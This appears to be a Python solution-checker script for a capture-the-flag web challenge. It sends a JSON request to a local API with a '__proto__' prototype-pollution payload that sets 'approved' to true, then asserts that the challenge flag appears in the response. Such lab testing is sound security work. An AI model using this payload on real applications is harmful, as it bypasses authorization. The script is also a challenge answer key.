import requests
from pathlib import Path
import yaml

s = requests.Session()

def test(url):
    HERE = Path(__file__).parent
    FLAG = yaml.safe_load(open(HERE / "meta.yml"))["flags"]

    website = (requests.post(f'{url}/api/v1/retrieve', json={"vhs":"Hackers","code":"4567890111","owner_name":"Mickael","__proto__":{"approved":True}}).text)
    print(website)

    assert FLAG in website


if __name__ == '__main__':
    test('http://localhost:3000')
